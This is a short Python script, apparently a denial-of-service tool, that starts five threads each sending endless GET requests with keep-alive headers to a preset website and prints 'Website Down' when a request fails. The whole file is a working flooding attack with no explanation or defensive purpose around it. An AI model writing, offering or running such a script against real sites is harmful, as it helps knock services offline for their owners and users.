import threading
import sys
import requests

def dos(url = "http://www.honeypots.studio"):
    while True:
        try:
            requests.get(url, headers={'Connection' : 'keep-alive'})
        except Exception:
            print("Website Down")
for _ in range(5):
	threading.Thread(target=dos).start()